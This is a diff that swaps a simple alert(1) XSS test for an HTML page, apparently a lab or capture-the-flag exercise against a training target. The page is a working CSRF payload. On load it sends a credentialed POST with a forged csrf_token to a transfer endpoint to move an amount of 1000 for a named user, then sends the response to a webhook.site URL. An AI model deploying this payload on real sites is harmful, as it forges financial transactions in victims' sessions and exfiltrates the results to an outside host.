@@ -1,2 +1,26 @@
-<h1>Thi</h1>
-<script>alert(1)</script>
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://phish-me.quoccacorp.com/api/transfer", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "csrf_token=Mjg1MQ==&username=Muiz&amount=1000"
+      })
+      .then(res => res.text())
+      .then(data => {
+        // Send result to webhook.site so YOU see if it worked
+        fetch("https://webhook.site/72c16f7a-b6f9-4a67-b6e8-eacf6c1e1e33", {
+          method: "POST",
+          headers: {
+            "Content-Type": "text/plain"
+          },
+          body: data
+        });
+      });
+    </script>
+  </body>
+</html>
